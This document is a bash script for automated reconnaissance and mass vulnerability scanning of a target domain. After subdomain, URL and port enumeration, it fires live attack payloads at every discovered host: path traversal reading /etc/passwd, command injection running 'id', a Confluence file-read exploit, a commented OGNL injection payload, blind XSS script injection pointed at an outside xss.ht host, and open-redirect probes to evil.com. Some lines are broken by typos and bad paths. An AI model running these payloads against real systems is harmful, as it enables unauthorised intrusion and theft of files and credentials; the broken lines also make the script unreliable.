#/bin/bash 

domain=$1
# Gather Subdomain
mkdir $domain/subdomain/ 
subfinder -d $1 -silent -all -o $domain/subdomain/subfinder.txt
findomain-linux --output $domain/subdomain/--target $1 
assetfinder -subs-only $1 | tee $domain/subdomain/assetfinder.txt
sublist3r -d $1 -o $domain/subdomain/sublister.txt
amass enum -passive -d $1 -o $domain/subdomain/amass.txt
cat $domain/subdomain/*.txt | sort -u | tee $domain/subdomain/sort_domain.txt
cat $domain/subdomain/sort_domain.txt | httpx -silent | tee $domain/subdomain/host.txt
# cat host.txt | httpx -mc 200 -silent | tee host.txt
cat $domain/subdomain/sort_domain.txt | httpx -silent | aquatone -ports 80 443 8000 8080 8443 

#Gather URLs
mkdir -p $domain/URLs
cat $domain/subdomain/host.txt | waybackurls | sort -u | uro | tee $domain/subdomain/wayback-urls.txt
gauplus $1 | sort -u | httpx -silent | tee $domain/subdomain/gauplus.txt
cat $domain/subdomain/host.txt | gauplus -b  | sort | uro | tee $domain/subdomain/gau-urls.txt
cat $domain/URLs/*.txt | sort -u | uro | httpx -silent | tee $domain/subdomain/urls.txt
cat $domain/URLs/usls.txt | httpx -mc 200 -silent | tee l$domain/subdomain/ive-urls.txt

#Gather GF Pattern 
mkdir -p $domain/GFPattern
cat $domain/URLs/live-urls.txt | gf redirect | tee $domain/GFPattern/gf-redirect.txt
cat $domain/URLs/live-urls.txt | grep "=http" | tee $domain/GFPattern/redirect.txt
cat $domain/URLs/live-urls.txt | gf xss | tee $domain/GFPattern/gf-xss.txt
cat $domain/URLs/live-urls.txt | gf sqli | tee $domain/GFPattern/gf-sqli.txt
cat $domain/URLs/live-urls.txt | gf ssrf | tee $domain/GFPattern/gf-ssrf.txt
cat $domain/URLs/live-urls.txt | gf lfi | tee $domain/GFPattern/gf-lfi.txt
cat $domain/URLs/live-urls.txt | gf idor | tee $domain/GFPattern/idor.txt
cat $domain/URLs/live-urls.txt | gf ssti | tee $domain/GFPattern/ssti.txt

# cat $domain/URLs/gau-urls.txt | gau -subs | grep "https://" | grep -v | "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind {xss.hunter.xt}
#IP Scan
mkdir $domain/IP
subfinder -d $1 | dnsx -a -resp-only -o $domain/IP/Ipa.txt
cat $domain/subdomain/host.txt | dnsx -a -resp-only -o $domain/IP/live-ipa.txt
subfinder -d $1 -silent -all | dnsx -a -resp-only | nrich - -o $domain/IP/nrich.out
subfinder -d $1 -silent | httpx -ip -silent -o $domain/IPhost-ip.txt
subfinder -d $1 -silent | httpx -asn -silent -o $domain/IPasn.out  
subfinder -d $a -silent | httpx -cname -silent -o $domain/IP/host-cname.txt  
naabu -l $domain/subdomain/sort_domain.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -top-ports 1000 -silent -o $domain/IP/naabu-ports.txt


#CNAME - A Record :
# subfinder -d $1 | dnsx -a -cname -resp | tee $domain/IP/CNAME-A-record.txt
# censys-ip:
censys search $1 | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d \"\ |tee $domain/IP/censys-ip.txt
#shodan-search
shodan search Ssl.cert.subject.CN:"$1" 200 --fields ip_str | httpx -silent | tee $domain/IP/shodan-ip.txt


# Paramspider 
python3 ~/ReconTool/ParamSpider/paramspider.py -d $1 --exclude woff,.css,.js,.png,.svg,.php,.jpg --output $domain/
# echo "Enter your target url[ajrun]: "
# read url
# arjun -u $url -oT arjun.txt
# Find hidden GET parameters in javascript files
# assetfinder $1 | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's 'var' '"$url"?' g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done | tee -a $domain/hidden-param

#Extract JS File 
mkdir $domain/JSFile
echo $1 | gau | grep '\.js$' | httpx -status-code -mc 200 -silent | grep 'application/javascript' | tee $domain/JSFile/jsfile1.txt
assetfinder $1 | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | grep ".*\.js" | tee $domain/JSFile/jsfile2.txt
gau --subs $1 | grep ".js$" | tee $domain/JSFile/jsfile.txt
subfinder -d $1 -silent | waybackurls | grep ".js$" | tee $domain/JSFile/jsfile3.txt
subfinder -d $1 -silent | httpx -silent | subjs | tee $domain/JSFile/jsfile4.txt
#Noted: Spider the host on burp and copy all the js file link from burp also so that you won’t miss any js file and paste it into jsfile.txt file
cat *.txt | sort -u | anew | httpx -silent | tee $domain/JSFile/final-jsfile.txt




#Nabbu Port discovery:
cat $domain/subdomain/sort_domain.txt | assetfinder -subs-only | naabu -sa -silent -nc -tp 80 -p 80 443 8080 8443 8090 9000 9001 9002 9003 | aquatone -out aquatone_screenshots 
# cat $domain/subdomain/sort_domain.txt | assetfinder | httprobe -c 50 -p http:80 http:8080 https:443 https:8443 http:9000 http:9001 http:9002 http:9003 | aquatone  -out screenshots -threads 50 


#wordpres sqli:
cat $domain/subdomain/host.txt | httpx --cl -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80 443 8080 8443  | anew myP1s.txt

#Scanning For XSS:
mkdir $domain/XSS/
cat $domain/URLs/gf-xss.txt | kxss | tee -a $domain/XSS/kxss.txt
cat $domain/output/*.txt | sed 's/FUZZ//g' | kxss | tee -a $domain/XSS/kxx2.txt
# Scanning Blind xss
# cat $domain/subdomain/host.txt | waybackurls | httpx -H "User-Agent: \"><script src=$abdulrahman2x.xss.ht></script>"
# waybackurls $1 | gf xss | sed 's/=.*/=/' | sort -u | tee $domain/XSS/Possible_xss.txt && cat $domain/XSS/Possible_xss.txt | dalfox -b https://abdulrahman2x.xss.ht pipe > output.txt

#Scanning for SSTI
# cat $domain/subdomain/subfinder.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
# ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080


#Vulnerability Scan 
cd ..
mkdir $domain/Technologies/
httpx -l subdomain/host.txt -threads 100 -match-string 'Moment.js' -o $domain/Technologies/Moment.txt            
httpx -l subdomain/host.txt -threads 100 -match-string 'wordpress' -o $domain/Technologies/wordpress.txt
httpx -l subdomain/host.txt -threads 100 -match-string 'Elementor' -o $domain/Technologies/Elementor.txt            
httpx -l subdomain/host.txt -threads 100 -match-string 'grafana' -o $domain/Technologies/grafana.txt
httpx -l subdomain/host.txt -threads 100 -match-string 'confluence' -o $domain/Technologies/confluence.txt
httpx -l subdomain/host.txt -threads 100 -match-string 'jira' -o $domain/Technologies/jira.txt
httpx -l subdomain/host.txt -threads 100 -match-string 'zimbra' -o $domain/Technologies/zimbra.txt
httpx -l subdomain/host.txt -threads 100 -match-string 'VMware' -o $domain/Technologies/wmware.txt
httpx -l subdomain/host.txt -threads 100 -match-string 'Elasticsearch' -o $domain/Technologies/Elasticsearch.txt
httpx -l subdomain/host.txt -threads 100 -match-string 'springcloud' -o $domain/Technologies/springcloud.txt


# Scanning For CORS:
cd ..
echo "Enter your domain URL For checking CORS:"
read cors
curl $cors -I -H Origin:evil.com | tee $domain/cors.txt

#CRLF Scanning:
crlfuzz -l $domain/subdomain/host.txt -o CRLF-scan.txt

#Subdomain-takeover
cat $domain/subdomain/host.txt | nuclei -t ~/subdomain-takeover.yaml | tee $domain/subdomain-takeover.out  
subzy -targets subdomain/host.txt --hide_fails --concurrency 100 | tee $domain/subdomain-takeover2.txt


#Scanning for Open-Redirect:
mkdir $domain/Open-reidrect  
waybackurls $1 | grep "=http" | qsreplace "https://evil.com" | while read host do;do curl -s -L  $host -I|grep "evil.com" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done |tee -a $domain/Open-reidrect/Vuln-open-redirect.txt
waybackurls $1 | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done | tee -a $domain/Open-reidrect/Vuln-open-redirect2.txt
waybackurls $1 | gf redirect | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done | tee $domain/Open-reidrect/open-redirect3.out
# waybackurls $1 | gf redirect | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done | httpx -sc -silent


#Scanning for LFI:
mkdir $domain/LFI 
gau $1  | egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | gf lfi | qsreplace "/etc/passwd" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "root:" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done | tee $domain/LFI/lfi.out
waybackurls $1 | gf lfi | qsreplace "/etc/passwd" | while read host do;do curl --insecure -s "$host" | grep "root:";done | tee -a $domain/LFI/lfi2.out
cat $domain/URLs/gf-lfi.txt | httpx -nc -t 250 -p 80 443 8080 8443 4443 8888 -path "///////../../../etc/passwd" -mr "root:x" | anew $domain/LFI/LfimyP1s.txt
cat $domain/subdomain/host.txt | httpx -nc -t 300 -p 80 443 8080 8443 8888 8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd"  -mr "root:x" -silent | tee -a $domain/LFI/lfi3.out  
cat $domain/subdomain/host.txt | gau |  gf lfi |  httpx -path /usr/share/wordlists/OneListForAll/dict/lfi_short.txt -threads 100 -random-agent -x GET POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:" | tee $domain/LFI/lfi4.out  


#nuclie scanning:
mkdir $domain/nuclei
cat $domain/subdomain/host.txt | nuclei -t ~/nuclei-templates -severity critical,high,medium,low -c 500 --bulk-size 500 -o $domain/nuclei/nuclei.out
# cat $domain/subdomain/host.txt | assetfinder -subs-only | httpx -silent -p 80 443 8080 8443 9000 9001 9002 9003 -nc  | nuclei -t ~/nuclei-templates/ --severity critical high medium low -silent
cat $domain/subdomain/host.txt | nuclei -t ~/TP5_Arbitrary_file_read.yaml -o $domain/nuclei/arbitary-fileread.out 
rustscan -a $domain/IP/live-ipa.txt -r 1-65535 | grep Open | tee $domain/IP/open-ports.txt | sed 's/Open//' | httpx -silent | nuclei -t ~/nuclei-templates -o $domain/nuclei/rustscan-result.out  


# OS Command Injection:
cat $domain/subdomain/host.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80 443 8080 8443 -mr "uid=" -silent -o $domain/os-injection.out  

# RCE oneliner:
httpx -l $domain/subdomain/host.txt -path "/_fragment?_path=_controller=phpcredits&flag=-1" -threads 100 -random-agent -x GET  -tech-detect -status-code  -follow-redirects -title -mc 200 -match-regex "PHP Credits" -o $domain/RCE.out

# Scanning confluence - onliner ; 
# Use this tool detect - ONGL injection vulnerability: git clone https://github.com/Nwqda/CVE-2022-26134
# curl --head -k "https://YOUR+TARGET.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20%2Fetc%2Fpasswd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"
# Atlassian Confluence Arbitrary File Read (CVE-2021-26085)
cat $domain/subdomain/host.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200 -o $domain/attlassian.txt


 #Scan for SQL
python3 ~/ReconTool/SQLiDetector/sqlidetector.py -f $domain/URLs/gf-sqli.txt -w 50 -o $domain/sqli-ouput.txt
cat $domain/URLs/gf-sqli.txt | sed 's/=.*/=/' | nuclei -t ~/sqli.yaml -o $domain/sqli-detect.out  













